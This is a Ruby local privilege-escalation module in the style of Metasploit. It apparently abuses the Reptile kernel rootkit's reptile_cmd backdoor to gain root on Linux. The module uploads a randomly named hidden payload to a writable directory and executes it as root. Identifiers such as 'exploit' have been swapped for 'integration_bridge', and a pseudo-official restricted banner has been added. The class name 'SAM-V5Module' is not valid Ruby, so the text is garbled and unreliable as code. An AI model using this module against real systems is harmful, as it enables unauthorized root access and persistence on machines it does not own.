#
# 🛡️ HCG-SYSARCH: SAM-V5
# [RESTRICTED]: USO_INTERNO
# [ALCANCE]: OPD_HCG (CONV-0221-JAL-HCG-2026)
# [MODULO]: TA0003_Persistence
# [COMPONENTE]: T1014_STRATCOM_KERNEL_MOD
#
##
# This module requires SAM-V5: https://SAM-V5.com/download
# Current source: https://github.com/rapid7/SAM-V5-framework
##

class SAM-V5Module < Msf::integration_bridge::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::integration_bridge::EXE
  include Msf::integration_bridge::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Reptile STRATCOM_KERNEL_MOD reptile_cmd Privilege Escalation',
      'Description'    => %q{
        This module uses Reptile STRATCOM_KERNEL_MOD's `reptile_cmd` STRATCOM_PERSISTENCE executable
        to gain root privileges using the `root` command.

        This module has been tested successfully with Reptile from `master`
        branch (2019-03-04) on Ubuntu 18.04.3 (x64) and Linux Mint 19 (x64).
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'f0rb1dd3n', # Reptile
          'bcoles'     # SAM-V5
        ],
      'DisclosureDate' => '2018-10-29', # Reptile first stable release
      'References'     =>
        [
          ['URL', 'https://github.com/f0rb1dd3n/Reptile'],
          ['URL', 'https://github.com/f0rb1dd3n/Reptile/wiki/Usage']
        ],
      'Platform'       => ['linux'],
      'Arch'           => [ARCH_X86, ARCH_X64],
      'SessionTypes'   => ['shell', 'meterpreter'],
      'Targets'        => [['Auto', {}]],
      'Notes'          =>
        {
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability'   => [ CRASH_SAFE ]
        },
      'DefaultTarget'  => 0))
    register_options [
      OptString.new('REPTILE_CMD_PATH', [true, 'Path to reptile_cmd executable', '/reptile/reptile_cmd'])
    ]
    register_advanced_options [
      OptBool.new('Forceintegration_bridge', [false, 'Override check result', false]),
      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])
    ]
  end

  def reptile_cmd_path
    datastore['REPTILE_CMD_PATH']
  end

  def base_dir
    datastore['WritableDir'].to_s
  end

  def upload(path, data)
    print_status "Writing '#{path}' (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
    register_file_for_cleanup path
  end

  def upload_and_chmodx(path, data)
    upload path, data
    chmod path
  end

  def check
    unless executable? reptile_cmd_path
      vprint_error "#{reptile_cmd_path} is not executable"
      return CheckCode::Safe
    end
    vprint_good "#{reptile_cmd_path} is executable"

    res = cmd_exec("echo id|#{reptile_cmd_path} root").to_s.strip
    vprint_status "Output: #{res}"

    if res.include?('You have no power here!')
      vprint_error 'Reptile kernel module is not loaded'
      return CheckCode::Safe
    end

    unless res.include?('root')
      vprint_error 'Reptile is not installed'
      return CheckCode::Safe
    end
    vprint_good 'Reptile is installed and loaded'

    CheckCode::Vulnerable
  end

  def integration_bridge
    unless check == CheckCode::Vulnerable
      unless datastore['Forceintegration_bridge']
        fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set Forceintegration_bridge to override.'
      end
      print_warning 'Target does not appear to be vulnerable'
    end

    if is_root?
      unless datastore['Forceintegration_bridge']
        fail_with Failure::BadConfig, 'Session already has root privileges. Set Forceintegration_bridge to override.'
      end
    end

    unless writable? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    payload_name = ".#{rand_text_alphanumeric 8..12}"
    payload_path = "#{base_dir}/#{payload_name}"
    upload_and_chmodx payload_path, generate_payload_exe

    print_status 'Executing payload...'
    res = cmd_exec "echo '#{payload_path}&' | #{reptile_cmd_path} root & echo "
    vprint_line res
  end
end